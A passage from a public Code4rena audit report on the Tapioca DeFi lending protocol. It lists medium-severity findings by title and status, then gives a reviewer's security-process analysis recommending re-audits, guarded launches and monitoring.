### [[M-49] [MC01] Market liquidations can revert due to arithmetic underflow](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1012)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1012), also found by [Koolex](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1589)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1012#issuecomment-1707858987)
***

### [[M-50] [HC07] `SGLLiquidation`: Liquidations will fail if `liquidationAddress` is set](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1002)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1002)*
<br>Status: [Sponsor Acknowledged](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1002#issuecomment-1701347319)
***

### [[M-51] [MB01] Inadvised hardcoding of pool address in `AaveStrategy.sol`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/993)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/993), also found by [0x007](https://github.com/code-423n4/2023-07-tapioca-findings/issues/888)*
<br>Status: [Sponsor Confirmed via duplicate issue 888](https://github.com/code-423n4/2023-07-tapioca-findings/issues/888)
***

### [[M-52] [HB09] `emergencyWithdraw` on all strategy contracts useless without a pause mechanism](https://github.com/code-423n4/2023-07-tapioca-findings/issues/989)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/989) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-989+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 1522](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1522)
***

### [[M-53] `SGLBorrow::repay` and `BigBang::repay` uses `allowedBorrow` with the asset amount, whereas other functions use it with share of collateral](https://github.com/code-423n4/2023-07-tapioca-findings/issues/920)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/920) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-920+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 578](https://github.com/code-423n4/2023-07-tapioca-findings/issues/578)
***

### [[M-54] `YieldBox::deposit`, `YieldBox::withdraw` might lock ERC1155 NFT if deposited/withdrawn with less than 1e8 share](https://github.com/code-423n4/2023-07-tapioca-findings/issues/916)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/916)*
<br>Status: [Sponsor Acknowledged](https://github.com/code-423n4/2023-07-tapioca-findings/issues/916#issuecomment-1690291114)
***

### [[M-55] The sending failure of _lzSend is not considered](https://github.com/code-423n4/2023-07-tapioca-findings/issues/894)
*Submitted by [zhaojie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/894)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/894#issuecomment-1697865869)
***

### [[M-56] read-only reentrancy in Curve Eth pool can lead to funds being stolen from the Lido strategy](https://github.com/code-423n4/2023-07-tapioca-findings/issues/889)
*Submitted by [c7e7eff](https://github.com/code-423n4/2023-07-tapioca-findings/issues/889)*
<br>Status: [Sponsor Acknowledged via duplicate issue 704](https://github.com/code-423n4/2023-07-tapioca-findings/issues/704)

***

### [[M-57] `_getDiscountedPaymentAmount` doesn't work for tokens with more than 18 decimals](https://github.com/code-423n4/2023-07-tapioca-findings/issues/879)
*Submitted by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/879) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-879+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 1104](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1104)
***

### [[M-58] mTapiocaOFT can't be rebalanced because the Balancer in tapiocaz-audit calls swapETH() or swap() of the RouterETH but does not forward ether for the message fee](https://github.com/code-423n4/2023-07-tapioca-findings/issues/813)
*Submitted by [0x73696d616f](https://github.com/code-423n4/2023-07-tapioca-findings/issues/813) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-813+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/813#issuecomment-1688609721)
***

### [[M-59] A portion of stargate token rewards earned by StargateStrategy are permanently locked in the contract](https://github.com/code-423n4/2023-07-tapioca-findings/issues/805)
*Submitted by [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/805) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-805+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/805#issuecomment-1685314129)
***

### [[M-60] possible reeentrancy if rewardToken is ERC777 or execute arbitrary code on senders/receivers using hooks](https://github.com/code-423n4/2023-07-tapioca-findings/issues/758)
*Submitted by [adeolu](https://github.com/code-423n4/2023-07-tapioca-findings/issues/758)*
<br>Status: [Sponsor Confirmed via duplicate issue 587](https://github.com/code-423n4/2023-07-tapioca-findings/issues/587)
***

### [[M-61] [M-01] `SGLCommon._getInterestRate()`: feeFraction multiplied by wrong base amount](https://github.com/code-423n4/2023-07-tapioca-findings/issues/743)
*Submitted by [0xnev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/743)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/743#issuecomment-1688318062)
***

### [[M-62] SGLLendingCommon.sol: The totalBorrowCap validation is incorrect](https://github.com/code-423n4/2023-07-tapioca-findings/issues/700)
*Submitted by [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/700), also found by [xuwinnie](https://github.com/code-423n4/2023-07-tapioca-findings/issues/619)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/700#issuecomment-1686881577)
***

### [[M-63] tOLP tokens that are not unlocked after they have expired cause the reward distribution to be flawed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/569)
*Submitted by [Ruhum](https://github.com/code-423n4/2023-07-tapioca-findings/issues/569), also found by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1102)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/569#issuecomment-1681154710)
***

### [[M-64] Potential loss of value in YieldBox's `depositETHAsset()`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/568)
*Submitted by [0xadrii](https://github.com/code-423n4/2023-07-tapioca-findings/issues/568) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-568+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 983](https://github.com/code-423n4/2023-07-tapioca-findings/issues/983)
***

### [[M-65] Loss of possible rewards in Curve Gauge](https://github.com/code-423n4/2023-07-tapioca-findings/issues/561)
*Submitted by [SaeedAlipoor01988](https://github.com/code-423n4/2023-07-tapioca-findings/issues/561), also found by [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/795)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/561#issuecomment-1707856688)
***

### [[M-66] FullMath and TickMath libraries desire overflow behavior](https://github.com/code-423n4/2023-07-tapioca-findings/issues/483)
*Submitted by [0xfuje](https://github.com/code-423n4/2023-07-tapioca-findings/issues/483) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-483+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 138](https://github.com/code-423n4/2023-07-tapioca-findings/issues/138)
***

### [[M-67] Magnetar V2 - mintFromBBAndLendOnSGL can not lock singularity assets to generate TOLP](https://github.com/code-423n4/2023-07-tapioca-findings/issues/476)
*Submitted by [zzebra83](https://github.com/code-423n4/2023-07-tapioca-findings/issues/476)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/476#issuecomment-1686439742)
***

### [[M-68] Compounding mechanism is broken/flawed in ConvexTricryptoStrategy](https://github.com/code-423n4/2023-07-tapioca-findings/issues/385)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/385), also found by [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/297)*
<br>Status: [Sponsor Confirmed via duplicate issue 297](https://github.com/code-423n4/2023-07-tapioca-findings/issues/297)
***

### [[M-69] Inconsistent `deposits` into `lendingPool` in `AaveStrategy.withdraw()` and `AaveStrategy.compound()`](https://github.com/code-423n4/2023-07-tapioca-findings/issues/378)
*Submitted by [LosPollosHermanos](https://github.com/code-423n4/2023-07-tapioca-findings/issues/378)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/378#issuecomment-1680947867)
***

### [[M-70] Swapper contract isn't validated for cross-chain leverage operations](https://github.com/code-423n4/2023-07-tapioca-findings/issues/377)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/377), also found by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1011)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/377#issuecomment-1688261681)
***

### [[M-71] `Seer.sol` inherits `OracleMulti.sol` which calls `_getQuoteAtTick` from `OracleMath.sol` , function which would revert when `_getRatioAtTick` is called since it doesn't allow overflow behavior](https://github.com/code-423n4/2023-07-tapioca-findings/issues/365)
*Submitted by [Vagner](https://github.com/code-423n4/2023-07-tapioca-findings/issues/365)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/365#issuecomment-1685310121)
***

### [[M-72] oTAP::participate - Call will always revert if msg.sender is approved but not owner](https://github.com/code-423n4/2023-07-tapioca-findings/issues/349)
*Submitted by [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/349), also found by [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1314)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/349#issuecomment-1680896487)
*** 

### [[M-73] All liquidated collateral can be stolen from Singularity and Big Bang](https://github.com/code-423n4/2023-07-tapioca-findings/issues/337)
*Submitted by [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/337), also found by [Koolex](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1599)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/337#issuecomment-1707732363)
***

### [[M-74] Stargate swap parameters perform unnecessary airdrop when rebalancing mTapiocaOFT tokens](https://github.com/code-423n4/2023-07-tapioca-findings/issues/336)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/336)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/336#issuecomment-1685309952)
***

### [[M-75] Rebalancing mTapiocaOFT of native token forces admin to pay for rebalance amount](https://github.com/code-423n4/2023-07-tapioca-findings/issues/334)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/334) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-334+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/334#issuecomment-1680869772)
***

### [[M-76] TapiocaOptionBroker::newEpoch - An epoch can be skipped leading for unclaimed tap to distribute to be lost](https://github.com/code-423n4/2023-07-tapioca-findings/issues/323)
*Submitted by [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/323), also found by [Udsen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1556)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/323#issuecomment-1680829672)
***

### [[M-77] Loss of COMP reward in CompoundStragety.sol](https://github.com/code-423n4/2023-07-tapioca-findings/issues/285)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/285), also found by [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/247)*
<br>Status: [Sponsor Confirmed via duplicate issue 247](https://github.com/code-423n4/2023-07-tapioca-findings/issues/247)
***

### [[M-78] AaveStragety#withdraw and emergecyWithdraw can revert if the supply cap is reached or isFrozen flag is on when compounding](https://github.com/code-423n4/2023-07-tapioca-findings/issues/283)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/283)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/283#issuecomment-1685308873)
***

### [[M-79] MagnetarMarketModule::_exitPositionAndRemoveCollateral -  Impossible to exitPosition without unlocking tOlp](https://github.com/code-423n4/2023-07-tapioca-findings/issues/250)
*Submitted by [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/250)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/250#issuecomment-1685301422)
***

### [[M-80] BigBang/Singularity::sellCollateral - Surplus of collateral with regards to repay amount is never returned to user](https://github.com/code-423n4/2023-07-tapioca-findings/issues/242)
*Submitted by [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/242), also found by [ladboy233](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1619)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/242#issuecomment-1699375116)
***

### [[M-81] averageMagnitude in TapiocaOptionBroker is updated wrongly](https://github.com/code-423n4/2023-07-tapioca-findings/issues/232)
*Submitted by [0xWaitress](https://github.com/code-423n4/2023-07-tapioca-findings/issues/232)*
<br>Status: [Sponsor disputed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/232#issuecomment-1813304589)

***

### [[M-82] Some actions inside MagnetarV2.burst will not work because msg.value is used inside delegate call](https://github.com/code-423n4/2023-07-tapioca-findings/issues/209)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/209) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-209+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/209#issuecomment-1685299412)
***

### [[M-83] USDOOptionsModule.exercise doesn't send refund to user](https://github.com/code-423n4/2023-07-tapioca-findings/issues/201)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/201)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/201#issuecomment-1685297909)
***

### [[M-84] SGLLeverage.multiHopSellCollateral checks swapper on wrong chain](https://github.com/code-423n4/2023-07-tapioca-findings/issues/200)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/200)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/200#issuecomment-1685297525)
***

### [[M-85] User can exercise oTAP options for 3 weeks from a 1 week lock](https://github.com/code-423n4/2023-07-tapioca-findings/issues/189)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/189), also found by [cergyk](https://github.com/code-423n4/2023-07-tapioca-findings/issues/321)*
<br>Status: [Sponsor Confirmed, but disagreed with severity](https://github.com/code-423n4/2023-07-tapioca-findings/issues/189#issuecomment-1685311515)
***

### [[M-86] Option brokers don't handle oracle decimals correctly when calculating payment amounts](https://github.com/code-423n4/2023-07-tapioca-findings/issues/188)
*Submitted by [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/188) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-188+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/188#issuecomment-1684443925)
***

### [[M-87] The twTAP multiplier can be compromised with manipulated deposits of low value cost and high duration](https://github.com/code-423n4/2023-07-tapioca-findings/issues/187)
*Submitted by [rokinot](https://github.com/code-423n4/2023-07-tapioca-findings/issues/187) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-187+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/187#issuecomment-1684438498)
***

### [[M-88] Oracle Manipulation using Uniswap V3 pool that is not yet deployed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/175)
*Submitted by [SaeedAlipoor01988](https://github.com/code-423n4/2023-07-tapioca-findings/issues/175)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/175#issuecomment-1684384410)
***

### [[M-89] all deposit and withdraw function in Convex and Curve nativeLP Strategy, apply slippage on internal pricing; which call real-time on chain price from Curve directly and subject to MEV](https://github.com/code-423n4/2023-07-tapioca-findings/issues/163)
*Submitted by [0xWaitress](https://github.com/code-423n4/2023-07-tapioca-findings/issues/163) (View multiple [reports](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+label%3Aduplicate-163+is%3Aclosed+) submitted by additional wardens)*
<br>Status: [Sponsor Confirmed via duplicate issue 245](https://github.com/code-423n4/2023-07-tapioca-findings/issues/245)
***

### [[M-90] ConvexTricryptoStrategy does not count CVX reward into compoundAmount and thus _currentBalance leading to an under-estimate of TVL](https://github.com/code-423n4/2023-07-tapioca-findings/issues/162)
*Submitted by [0xWaitress](https://github.com/code-423n4/2023-07-tapioca-findings/issues/162), also found by [minhtrng](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1663)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/162#issuecomment-1686858227)
***

### [[M-91] There is no mechanism to track and resolve bad debt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/145)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/145), also found by [0x007](https://github.com/code-423n4/2023-07-tapioca-findings/issues/582)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/145#issuecomment-1678131030)
***

### [[M-92] Executing transfers before reverting (AKA bad execution flow/logic design)](https://github.com/code-423n4/2023-07-tapioca-findings/issues/128)
*Submitted by [erebus](https://github.com/code-423n4/2023-07-tapioca-findings/issues/128)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/128#issuecomment-1677977763)
***

### [[M-93] BigBang Contract: The repay function can be DoSed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/64)
*Submitted by [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/64), also found by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1200)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/64#issuecomment-1677499746)

***

### [[M-94] Blocking the receiving channel by claiming long arbitrary rewards token from a twTAP position](https://github.com/code-423n4/2023-07-tapioca-findings/issues/31)
*Submitted by [HE1M](https://github.com/code-423n4/2023-07-tapioca-findings/issues/31)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/31#issuecomment-1674921065)
***

### [[M-95] reverting with long message leads to DoS attack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/27)
*Submitted by [HE1M](https://github.com/code-423n4/2023-07-tapioca-findings/issues/27)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/27#issuecomment-1674905123)
***

### [[M-96] DoS attack by consuming all the gas during minting NFT callback](https://github.com/code-423n4/2023-07-tapioca-findings/issues/26)
*Submitted by [HE1M](https://github.com/code-423n4/2023-07-tapioca-findings/issues/26)*
<br>Status: [Sponsor Confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/26#issuecomment-1674895679)
***

### [[M-97] The `owner` is a single point of failure and a centralization risk](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d#m01-the-owner-is-a-single-point-of-failure-and-a-centralization-risk)
*Submitted by [IllIllI-bot](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d#m01-the-owner-is-a-single-point-of-failure-and-a-centralization-risk)*
<br>Status: [Sponsor Acknowledged](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d?permalink_comment_id=4730595#gistcomment-4730595)

*Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d). It was declared out of scope for the audit competition, but is being included here for completeness.*
***

### [[M-98] Unsafe use of `transfer()`/`transferFrom()` with `IERC20`](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d#m04-unsafe-use-of-transfertransferfrom-with-ierc20)
*Submitted by [IllIllI-bot](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d#m04-unsafe-use-of-transfertransferfrom-with-ierc20)*
<br>Status: [Sponsor Confirmed](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d?permalink_comment_id=4730595#gistcomment-4730595)

*Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d). It was declared out of scope for the audit competition, but is being included here for completeness.*
***

### [[M-99] Return values of `transfer()`/`transferFrom()` not checked](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d#m06-return-values-of-transfertransferfrom-not-checked)
*Submitted by [IllIllI-bot](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d#m06-return-values-of-transfertransferfrom-not-checked)*
<br>Status: [Sponsor Confirmed](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d?permalink_comment_id=4730595#gistcomment-4730595)

*Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/CloudEllie/eafeb9865761200397c00d70febe5f9d). It was declared out of scope for the audit competition, but is being included here for completeness.*
***

# Low Risk and Non-Critical Issues

For this audit, 79 reports were submitted by wardens detailing low risk and non-critical issues. This [report](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1047) by **0xSmartContract** received the top score from the judge.

*View all Low Risk and Non-Critical submissions [here](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+is%3Aopen+QA+label%3A%22QA+%28Quality+Assurance%29%22).* 

***

# Gas Optimizations

For this audit, 19 reports were submitted by wardens detailing gas optimizations. This [report](https://github.com/code-423n4/2023-07-tapioca-findings/issues/129) by **Sathish9098** received the top score from the judge.

*View all Gas Optimization submissions [here](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+is%3Aopen+%22gas+optimizations%22+).*

***

# Audit Analysis

For this audit, 20 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1565) by **GalloDaSballo** received the top score from the judge.

*View all Audit Analyses [here](https://github.com/code-423n4/2023-07-tapioca-findings/issues?q=is%3Aissue+is%3Aopen+%22analysis%22+label%3Aanalysis-advanced).*

### Executive Summary

The Tapioca system is comprised of multiple interdependent smart-contract systems.

At the highest level we can separate the system into:

Core:
  - Market -> Lending Logic
  (Includes yield box as it's underlying accounting system)
  (Assumes using Yield Box strategies that do nothing to mitigate composability risks)

Extra:
  - Tokenomics

Periphery:
  - Yield Strategies
  - Oracle
  - Swappers

The interrelation between Market, Tokenomics and Periphery has mostly to do with determining value and exchanging it, this creates additional risks at these "edges".

That said, from a thorough analysis it seems to me like the system has grown to be quite complex, with different levels of risk and attacks that can be performed.

My analysis focuses on the additional risk that comes from the composability within the in-scope systems.

The goal of the analysis is to show my adversarial thought process and to suggest a robust security process to ship the codebase in a state that is maintainable and safe for people to use.

### Re-Audit the Market, separately as the Core Primitive

For this reason, it seems reasonable to suggest the following:

- Re-audit Market, with Oracles and Swappers separately
Iterate on the Market logic until it's extremely solid and battle tested

Once the Market logic is fully ready, adding additional pieces, such as Yield Generation becomes achievable.

Most importantly, the Market will require:
- Monitoring
- Periphery Contract Creation (optimal swaps, liquidations, MEV, arbitrage)
- Documentation and Evangelizing to ensure enough MEV actors are present to allow efficient markets

All of this to suggest that the Market aspect of the system is already "risky enough" on it's own, it would be beyond rekless for me to suggest deploying the system as a whole as of today due to how likely it is for some periphery aspects to add further attack vectors or break invariant at the core level.

### Gradually Introduce Risk, in a segregated manner

After the Market is lindy, each new token, oracle and strategy could be added separately with a capped amount to reduce risk.

This addition should be looked at as a separate security exercise, which could be lead by a separate team.

The extra pieces should be looked very thoroughly as to avoid adding vulnerabilities to the core.

As of today, due to the interrelation between Market, Yield Box, Strategy and Pricing being so uniquely and tightly coupled means that a vulnerability at the Strategy Level (e.g. mispricing), will leak value to a degree that allows bankrupting the market.

**Separate the Pricing from the Harvesting**

Reducing this could be performed by separating the pricing aspect of the underlying yield strategy from the pricing of the underlying asset.

An example would be spinning up an oracle for the TriCrypto Strategy while allowing the redemption of rewards as pro-rata via a SNX like contract.

Another consideration is pricing of about to be harvested collateral, which is a very low hanging fruit for arbitrage and MEV.

### Analysis on Test Coverage, not by line but by scenario

From skimming the tests it seems like they do cover most happy paths, but they don't seem to test for adversarial situations, for example: 

- Loss to the strategy 
- DOS of the strategy

### Systemic Risks and Privileges

The Core System does require governance for managing of collaterals, and debtRates.

These seem to be part a requirement for most Lending Protocols.

That said, the separation of each Collateral into separate Singularities does seem to offer a reduced risk as each pool has to be actively opted in by participants of the marketplace.

When it comes to strategies on the other hand, a higher degree of trust and risks are involved.

While there seems to be direct protection for the principal, the Admin Privilege of triggering Emergency Withdrawals could potentially be used to leak value, especially for strategies that are Single Sided (from Token to LP back to Token), for which Sandwiching is always possible, but FlashLoan imbalance attacks become possible mostly only to the Admin.

### Risks to end users

Main risks beside invariants being broken (Why I recommend a second audit of Core and then continous security efforts on periphery), are going to be related to composability.

The strategies integrating into different protocols create an ever moving attack surface that will require active risk management, some of which will also require understanding the tradeoff between risking the invested funds and gaining Yield.

### Concerns around the complexity of the system

The main threat I can see is how the system is being "sold as one", in the idea that all of these components will be launched together, which creates exponentially more complexity and risk than if we were dealing with each component separately.

A great example of the Sponsor understanding this was in Formally Verifying YieldBox:

- YieldBox is done
- We know the risk is at the Strategy Level
- We can focus on the rest

I believe a similar exercise could be done for BigBang and Singularity and would give a very different level of confidence in the Core of the system.

From my years of experience in DeFi I believe I have identified gotchas and risks for all the strategies, some of which just come with the territory, however, building on non fully battle-tested core, adds further uncertainty that we wouldn't have to explore if BigBang and Singularity were audited and verified independently.

### Low hanging fruits for attackers and gotchas

I hope I made a clear case that the biggest area of attack is in the Periphery and in how it relates to the rest of the system.

Being able to manipulate a single price feed can cause extreme damage, even when the system fully works.

Collateral separation is definitely a positive there, however, some collaterals are more popular than others, which may still allow attackers to severely damage the system.

On one hand this can be mitigated via having tiered amounts of capital (raise interest rates if capital goes too high).

On the other hand this is part of the bigger challenge in Decentralized Money Markets.

### On Formal Verification

The fact that Formal Verification was done for YieldBox is laudable, however, it's important to keep in mind this is not a silver bullet.

Per the Certora Report, the safety and consistency of YieldBox is reliant on the correct accounting of Strategies, which were Out Of Scope at the time of Formal Verification.

This further highlights how additional code doesn't just add new risks to itself, but also to more foundational code.

From my perspective it's extremely important that each piece is looked at individually first and then the composability of each part is further explored.

### Process Risks

The process that has been followed seems very risky and I wouldn't be surprised if a lot of valid findings were found in the CodeArena Audit.

From my experience, any audit with even one High Severity, should be followed by another audit, to make sure that the mitigations have been addressed and that no second-order consequences have been created due to minor changes.

### Ideal Process

Due to the inherently high surface area, the first set of exercises should be focused exclusively in securing the BigBang, USD0 and Singularity System.

These contracts would need to be audited to ensure all invariants are addressed, and external risks should be properly modelled (e.g. Oracle as single point of failure).

**Realized Process**

Only YieldBox has been Formally Verified by Certora, this means that BigBang, USD0 and Singularity haven't.

This to me indicates a lower level of maturity in terms of the security of the system.

Only once these core contracts have been secured, by performing multiple audits and security contests, you should opt to perform similar level of security reviews for the Periphery and Oracle Contracts.

### Balancing growth and risk

On one hand guarded launches can offer a way to reduce total value at risk, at the same time, we all know that any exploit can severely undermine the reputation of a project.

From my experience in DeFi there is no such thing as a "small review", any minor change (e.g. the Euler Change for Dust Amounts), can have dramatic second, third or even higher order impacts.

For this reason new types of oracles, and strategies should be introduced after serious scrutiny and reviews are performed, this means that no "small tweak" should ever be added.

At the same time, live monitoring, live fuzzing and a rapid response bug bounty can help mitigate actual value loss while allowing for faster experimentation.

### In Summary

Unless no High Severity was found, do not limit yourself to a Mitigation Review and then launch, the downside and the risks are too high.

Instead, consider doing an additional audit for all to participate in, and then proceed with a Guarded Launch and a Bug Bounty.

Allow ample time for SRs to check your code, do not rush these phases as the downside massively outweighs the benefits of rushing.

### Suggested Next Steps

- Based on the findings, determine the weaker areas (periphery most likely).

- Harden the Core first, as a separate security exercise.

- Develop a plan to progressively stress test the periphery, while allowing safety.

- Due to the variability of the Strategies, you should have Active Monitoring Setup with the goal of Pausing and Deprecating Strategies as fast as possible.

### Time spent
50 hours

**[cryptotechmaker (Tapioca) acknowledged](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1565#issuecomment-1708015310)**

***

# Disclosures

